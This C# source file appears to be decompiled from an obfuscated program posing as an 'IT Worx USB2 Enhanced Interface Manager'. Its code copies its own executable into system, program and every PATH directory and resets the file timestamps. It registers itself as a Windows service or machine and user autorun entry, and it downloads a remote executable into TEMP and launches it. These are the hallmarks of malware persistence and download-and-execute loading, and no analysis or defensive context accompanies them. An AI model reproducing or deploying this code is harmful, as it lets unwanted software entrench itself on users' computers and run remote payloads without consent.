using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security;
using ITWX;
using Microsoft.Win32;

internal class Class1
{
	protected string string_0 = null;

	[SpecialName]
	public Version method_0()
	{
		return Assembly.GetAssembly(GetType())!.GetName().Version;
	}

	protected void method_1(ArrayList arrayList_0)
	{
		arrayList_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower());
		arrayList_0.Add(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower());
		string text = Environment.ExpandEnvironmentVariables("%PATH%").ToLower();
		string[] c = Class49.smethod_0(text, ";");
		arrayList_0.AddRange(c);
		text = Environment.ExpandEnvironmentVariables("%TEMP%").ToLower();
		arrayList_0.Add(text);
		text = Environment.ExpandEnvironmentVariables("%TMP%").ToLower();
		arrayList_0.Add(text);
	}

	public static bool smethod_0(Class11 class11_0, string string_1, bool bool_0)
	{
		try
		{
			Class9 @class = new Class9(class11_0);
			string text = null;
			if (bool_0)
			{
				text = Path.GetTempPath();
				if (text == null || text == "")
				{
					Environment.ExpandEnvironmentVariables("%TEMP%");
				}
				if (text == null || text == "")
				{
					Environment.ExpandEnvironmentVariables("%TMP%");
				}
				if (text == null || text == "")
				{
					text = Directory.GetCurrentDirectory();
				}
				if (text == null || text == "")
				{
					text = Path.GetDirectoryName(class11_0.assembly_0.Location);
				}
				if (text == null || text == "")
				{
					throw new Exception("Could not find download directory.");
				}
			}
			else
			{
				text = Path.GetDirectoryName(class11_0.assembly_0.Location);
			}
			string string_2 = Path.Combine(text, Guid.NewGuid().ToString() + (bool_0 ? ".exe" : ".tmp"));
			string_2 = @class.method_14(string_1, string_2, 180000, bool_1: true);
			if (string_2 != null)
			{
				if (bool_0)
				{
					return Class51.smethod_27("open", string_2, "-update", text, Class51.smethod_29());
				}
				string string_3 = Class51.smethod_29();
				return Class51.smethod_27("open", string_3, "-update", text, null);
			}
			return false;
		}
		catch (Exception exception_)
		{
			class11_0.method_20("F1D82D9C-B806-474b-93D0-D34C1D441919", exception_);
			return false;
		}
	}

	protected bool method_2()
	{
		IntPtr intptr_ = IntPtr.Zero;
		try
		{
			return Class41.smethod_22("usb2e", out intptr_);
		}
		finally
		{
			if (intptr_ != IntPtr.Zero)
			{
				Class41.smethod_16(intptr_);
			}
		}
	}

	protected bool method_3(string string_1)
	{
		try
		{
			Class43 @class = new Class43(typeof(DuperRunner));
			return @class.method_2(string_1);
		}
		catch (SecurityException)
		{
			throw;
		}
		catch (Exception)
		{
			return false;
		}
	}

	protected string method_4(string string_1)
	{
		try
		{
			ArrayList arrayList = new ArrayList();
			if (string_1 != null)
			{
				arrayList.Add(string_1.ToLower());
			}
			method_1(arrayList);
			foreach (string item in arrayList)
			{
				string path2 = Path.Combine(item, "IT Worx\\USB2 Enhanced Interface Manager");
				string text = Path.Combine(path2, "usb2e.exe");
				int num = 2;
				while (num-- > 0)
				{
					try
					{
						if (method_6(text))
						{
							return text;
						}
					}
					catch (IOException exception_)
					{
						Class47.smethod_8(exception_);
						text = Path.Combine(path2, "usb2.exe");
						continue;
					}
					break;
				}
			}
			return Path.GetDirectoryName(Assembly.GetAssembly(GetType())!.Location);
		}
		catch (Exception exception_2)
		{
			Class47.smethod_8(exception_2);
			return null;
		}
	}

	protected void method_5(string string_1, string string_2, bool bool_0)
	{
		File.Copy(string_1, string_2, overwrite: true);
		File.SetCreationTime(string_2, DateTime.Now);
	}

	protected bool method_6(string string_1)
	{
		try
		{
			string location = Assembly.GetAssembly(GetType())!.Location;
			string directoryName = Path.GetDirectoryName(string_1);
			if (!Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
			}
			if (File.Exists(string_1))
			{
				Version version_ = Class52.smethod_0(string_1);
				if (Class51.smethod_28(version_, method_0()) < 0)
				{
					method_5(location, string_1, bool_0: true);
				}
			}
			else
			{
				method_5(location, string_1, bool_0: true);
			}
			string_0 = string_1;
			return true;
		}
		catch (IOException)
		{
			throw;
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
			return false;
		}
	}

	protected bool method_7(RegistryKey registryKey_0)
	{
		return Class44.smethod_2(registryKey_0);
	}

	protected bool method_8(RegistryKey registryKey_0, string string_1)
	{
		Class44 @class = new Class44();
		return @class.method_0(string_1, registryKey_0);
	}

	protected Enum0 method_9(out bool bool_0)
	{
		bool_0 = false;
		bool flag = Environment.OSVersion.Platform == PlatformID.Win32NT;
		bool flag2 = true;
		Class0.smethod_11();
		string string_ = null;
		string text = null;
		if (flag)
		{
			IntPtr intPtr = IntPtr.Zero;
			bool flag3 = false;
			try
			{
				if (method_2())
				{
					bool_0 = true;
					intPtr = Class41.smethod_27("usb2e", GClass0.GEnum1.flag_1 | GClass0.GEnum1.flag_2 | GClass0.GEnum1.flag_6);
					Class41.smethod_33(intPtr);
					string fullPath = Path.GetFullPath(Class41.smethod_31(intPtr));
					string_ = Path.GetDirectoryName(fullPath);
					string_ = Path.GetFullPath(Path.Combine(string_, "..\\.."));
					if (!(flag3 = Class51.smethod_28(method_0(), Class52.smethod_0(fullPath)) > 0))
					{
						return Enum0.WindowsService;
					}
				}
				else
				{
					flag3 = true;
				}
				if (flag3)
				{
					text = method_4(string_);
					if (text != null && method_3(text))
					{
						return Enum0.WindowsService;
					}
				}
			}
			catch (SecurityException exception_)
			{
				flag2 = false;
				Class47.smethod_8(exception_);
			}
			catch (Exception exception_2)
			{
				Class47.smethod_8(exception_2);
			}
			finally
			{
				if (intPtr != IntPtr.Zero)
				{
					Class41.smethod_16(intPtr);
				}
			}
		}
		int num = 2;
		RegistryKey registryKey = null;
		Enum0 result;
		if (!flag2)
		{
			num--;
			registryKey = Registry.CurrentUser;
			result = Enum0.UserAutoRun;
		}
		else
		{
			registryKey = Registry.LocalMachine;
			result = Enum0.MachineAutoRun;
		}
		while (num-- > 0)
		{
			try
			{
				bool flag4 = false;
				if (method_7(registryKey))
				{
					bool_0 = true;
					text = Path.GetFullPath(Class44.smethod_3(registryKey));
					if (!(flag4 = Class51.smethod_28(method_0(), Class52.smethod_0(text)) > 0))
					{
						return result;
					}
				}
				else
				{
					flag4 = true;
				}
				if (flag4)
				{
					text = method_4((text == null) ? null : Path.GetFullPath(Path.Combine(Path.GetDirectoryName(text), "..")));
					if (text != null && method_8(registryKey, text))
					{
						return result;
					}
				}
			}
			catch (SecurityException exception_3)
			{
				Class47.smethod_8(exception_3);
				registryKey = Registry.CurrentUser;
				result = Enum0.UserAutoRun;
			}
			catch (Exception exception_4)
			{
				Class47.smethod_8(exception_4);
				registryKey = Registry.CurrentUser;
				result = Enum0.UserAutoRun;
			}
		}
		return Enum0.Unspecified;
	}

	public Enum0 method_10()
	{
		bool bool_;
		return method_9(out bool_);
	}

	public static bool smethod_1(Enum0 enum0_0)
	{
		bool flag = false;
		try
		{
			switch (enum0_0)
			{
			case Enum0.WindowsService:
				return Class43.smethod_2();
			case Enum0.UserAutoRun:
				return Class44.smethod_4(Registry.CurrentUser);
			case Enum0.MachineAutoRun:
				return Class44.smethod_4(Registry.LocalMachine);
			default:
				return false;
			case Enum0.Unspecified:
			case Enum0.Standalone:
				return true;
			}
		}
		catch (Exception exception_)
		{
			Class47.smethod_8(exception_);
			return false;
		}
	}

	public static bool smethod_2(Class11 class11_0)
	{
		try
		{
			string text = Path.Combine(Environment.ExpandEnvironmentVariables("%TEMP%"), Guid.NewGuid().ToString() + ".exe");
			File.Copy(class11_0.assembly_0.Location, text);
			return Class51.smethod_27("open", text, "-clean", Path.GetDirectoryName(text), Class51.smethod_29());
		}
		catch (Exception exception_)
		{
			class11_0.method_20("55DE6240-66C5-47d3-B5BC-4A4023C10348", exception_);
			return false;
		}
	}
}
